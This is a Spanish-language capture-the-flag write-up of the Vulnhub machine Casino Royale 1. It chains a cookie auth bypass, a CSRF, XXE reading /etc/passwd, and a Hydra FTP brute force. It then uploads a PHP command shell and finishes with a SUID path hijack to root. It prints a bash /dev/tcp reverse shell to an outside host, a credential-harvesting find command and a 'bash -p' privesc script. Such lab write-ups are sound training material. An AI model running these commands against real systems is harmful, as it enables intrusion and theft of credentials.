---
author: Helder
title: Vulnhub - Casino Royal 1
categories: [Vulnhub,Eazy]
tags : [Linux,CSRF,XXE]
date: 2023-10-15 11:33:00 +0800
---
Description: The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. 
Will you gain your status as a 00 agent?

- Flag is /root/flag/flag.sh

Máquina [**Casino Royal 1**](https://www.vulnhub.com/entry/casino-royale-1,287/)

---
## Reconocimiento
Identificamos el Target y escaneamos los puertos abiertos.
![arp](https://helhat.github.io/assets/img/Casino_Royal/arp.png){: .normal }
![scan](https://helhat.github.io/assets/img/Casino_Royal/scan1.png){: .normal }

Realizamos el escaneo por nmap de las principales recursos por http.
![scan2](https://helhat.github.io/assets/img/Casino_Royal/scan2.png){: .normal }

De toda las rutas encontradas, tenemos uno interesante, en donde nos muestra este servicio PokerMax.
![install](https://helhat.github.io/assets/img/Casino_Royal/install.png){: .normal }

Al parecer este servicio es vulnerable
> configure.php in PokerMax Poker League Tournament Script 0.13 allows remote attackers to bypass authentication and gain administrative access by setting the ValidUserAdmin cookie.
De igual manera vemos un nombre de una tabl *pokerleague*, tendremos esto en cuenta.

![poker](https://helhat.github.io/assets/img/Casino_Royal/poker.png){: .normal }

Buscando en la web, econtramos un exploit,el cual nos indica que podemos agregar la siguiente línea en la consola de la web, en la ruta que se muestra más abajo.

![exploit](https://helhat.github.io/assets/img/Casino_Royal/exploit.png){: .normal }

Si no existe pokerleague, buscamos por pokeradmin y es aquí donde ingresamos esta línea de java
De esta manera se agrega la cookie.

![java](https://helhat.github.io/assets/img/Casino_Royal/java.png){: .normal }

Como se observa ya tenemos almacenada el valor admin. 
Cargamos la página y ya tenemos acceso.

![admin](https://helhat.github.io/assets/img/Casino_Royal/admin.png){: .normal }

Ya dentro de pokeradmin,vemos el perfil del usuario admin y tenemos una descripcion, que referencia a un Virtual Hosting, por ende, modificamos en /etc/hosts con el dominio mostrado.

![useradmin](https://helhat.github.io/assets/img/Casino_Royal/useradmin.png){: .normal }
![vh](https://helhat.github.io/assets/img/IMF/vh.png){: .normal }

## Enumeracion

Ahora dentro de esta plataforma pokeradmin buscaremos vectores de explotación, es aqui donde podemos visualizar usuarios, donde uno de ellos tiene un email (Valenka)

![users](https://helhat.github.io/assets/img/Casino_Royal/users.png){: .normal }
![valenka](https://helhat.github.io/assets/img/Casino_Royal/valenka.png){: .normal }

Click *Edit Info*, podemos apreciar que tiene otro recurso adicional, bajo casino-royal.local
![host](https://helhat.github.io/assets/img/Casino_Royal/host.png){: .normal }

Al ingresar tenemos otra plataforma Snowfox.
![snow](https://helhat.github.io/assets/img/Casino_Royal/snow.png){: .normal }

Buscaremos un posible exploit, y al parecer tiene un CSRF que agrega un usuario admin.
Usamos el cuerpo del script en html y lo editamos.

![search](https://helhat.github.io/assets/img/Casino_Royal/search.png){: .normal }
![html](https://helhat.github.io/assets/img/Casino_Royal/html.png){: .normal }

Dentro de la página de Snowfox nos muestra un mensaje, este nos indica que valenka lee los mensajes, y tiene permisos administradores, entonces si enviamos un archivo html con estos campos modificados y generamos un CSRF, podremos tener un acceso a esta plataforma Snowfox.

![msj](https://helhat.github.io/assets/img/Casino_Royal/msj.png){: .normal }


## Explotacion
**CSRF**
Creamos un .html donde modificamos los campos necesarios,y asi para obtener el CSRF.

![body](https://helhat.github.io/assets/img/Casino_Royal/body.png){: .normal }

Pero como enviamos un correo, es aquí donde recordamos que teníamos un servicio SMTP en el puerto 25. Es de esta manera que podremos conectarnos a este y enviar desde aqui el mensaje.

![telnet](https://helhat.github.io/assets/img/Casino_Royal/telnet.png){: .normal }

Compartimos el servicio html antes de enviar el mensaje.

![server](https://helhat.github.io/assets/img/Casino_Royal/server.png){: .normal }
![rece](https://helhat.github.io/assets/img/Casino_Royal/rece.png){: .normal }

Una vez con éxito ya podemos loguearnos con el usuario creado.

![login](https://helhat.github.io/assets/img/Casino_Royal/login.png){: .normal }


Teniendo acceso tenemos una lista de email.Vemos un apartado de Manage user, enumeramos uno por uno.

![enum](https://helhat.github.io/assets/img/Casino_Royal/enum.png){: .normal }

El usuario le@casino-royale.local , tiene una dirección adicional que nos redireccionará a esta web.

![ultra](https://helhat.github.io/assets/img/Casino_Royal/ultra.png){: .normal }


Quitamos el .php y nos damos cuenta que tenemos capacidad de Directory Listing. Así que podemos buscar la forma de subir un archivo y ejecutarlos en este directorio.

![access](https://helhat.github.io/assets/img/Casino_Royal/access.png){: .normal }


**XXE**
Regresando a la pagina anterior,miramos el código de esta página y observamos que por POST, puede ser vulnerable a XML.

![crede](https://helhat.github.io/assets/img/Casino_Royal/crede.png){: .normal }

Adicionalmente a ello vemos que imprime Welcome ! , como no se le asigna ningún usuario, no se muestra en la respuesta.

![welcome](https://helhat.github.io/assets/img/Casino_Royal/welcome.png){: .normal }

Capturamos y cambiamos la petición a POST, Agregamos los campos del XML para usuario y password, enviamos y confirmamos XML, puesto que nos muestra el campo del usuario en el Render del Response.

![burp](https://helhat.github.io/assets/img/Casino_Royal/burp.png){: .normal }

De esta manera aplicamos el XXE, para leer el archivo /etc/passwd

![xxe](https://helhat.github.io/assets/img/Casino_Royal/xxe.png){: .normal }
![new](https://helhat.github.io/assets/img/Casino_Royal/new.png){: .normal }

Tenemos un nuevo usuario, generamos un ataque con Hydra por FTP,si deseas usar rockyou.txt esto tomara 2h para encontrar una passwd, y logearnos. Les adelanto que la contraseña empezaría con bank.
```
hydra -l ftpUserULTRA -P pass.txt ftp://192.168.65.144 -t 15
```
Ya dentro del servicio ftp, buscamos subir un archivo con extension php.

![ftp](https://helhat.github.io/assets/img/Casino_Royal/ftp.png){: .normal }

Encontramos estos recursos, que son los mismos vistos en la web. Por ende subiremos un archivo malicioso.

![files](https://helhat.github.io/assets/img/Casino_Royal/files.png){: .normal }

**RCE**
Creamos el .php , con un parametro cmd.

![hack](https://helhat.github.io/assets/img/Casino_Royal/hack.png){: .normal }

Pero al intentar subir el archivo, el sistema nos impide. Puede ser por la extension, así que intentaremos bypassear. Cambiando la extension a php3.

![put](https://helhat.github.io/assets/img/Casino_Royal/put.png){: .normal }

Se subió de manera exitosa.

![tran](https://helhat.github.io/assets/img/Casino_Royal/tran.png){: .normal }

Asi que en la web, cargamos el recurso y ejecutamos el comando que deseamos.

![web](https://helhat.github.io/assets/img/Casino_Royal/web.png){: .normal }

Pero nos damos con la sorpresa que no tenemos respuesta, esto nos hace pensar que no tenemos el permiso de ejecutar el archivo.

![cmdd](https://helhat.github.io/assets/img/Casino_Royal/cmdd.png){: .normal }

Cambiamos permisos

![perm](https://helhat.github.io/assets/img/Casino_Royal/perm.png){: .normal }


Y ahora ejecutamos nuestra Reverse shell. Recomendado urlencodear el & con %26
```
bash -c "bash -i >& /dev/tcp/192.168.65.139/443 0>&1"
```
![netcat](https://helhat.github.io/assets/img/Casino_Royal/netcat.png){: .normal }


## Persistencia
De esta manera enumeramos el sistema, para ello en esta misma ruta es bueno verificar archivos de configuración almacenados.
```
find . -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
```

Tenemos nuevas credenciales

![cred](https://helhat.github.io/assets/img/Casino_Royal/cred.png){: .normal }
![esc](https://helhat.github.io/assets/img/Casino_Royal/esc.png){: .normal }

Buscamos suid. Y encontramos un recurso

![sui](https://helhat.github.io/assets/img/Casino_Royal/sui.png){: .normal }

Al intentar ejecutar este binario, no encuentra un run.sh

![run](https://helhat.github.io/assets/img/Casino_Royal/run.png){: .normal }

Lo curioso es que existe un run.sh dentro de la misma carpeta, pero solo lo ejecuta el usuario *le*, no valeska. Así que analizaremos el script, para encontrar una respuesta.

![per](https://helhat.github.io/assets/img/Casino_Royal/per.png){: .normal }

```
strings /opt/casino-royale/mi6_detect_test
```

Y en efecto vemos que simplemente ejecuta una bash de run.sh, no especifica la ruta completa, de esta manera podemos aprovechar esto.

![strg](https://helhat.github.io/assets/img/Casino_Royal/strg.png){: .normal }

Es aquí donde creamos nuestro archivo run.sh que el binario si pueda ejecutar.

![crear](https://helhat.github.io/assets/img/Casino_Royal/crear.png){: .normal }

```
#!/bin/bash

bash -p
```
Ejecutamos el binario y ya tendremos acceso root.

![edit](https://helhat.github.io/assets/img/Casino_Royal/edit.png){: .normal }

Podemos observar la flag por la web, utilizando php.

![serv](https://helhat.github.io/assets/img/Casino_Royal/serv.png){: .normal }

![root](https://helhat.github.io/assets/img/IMF/root.png){: .normal }




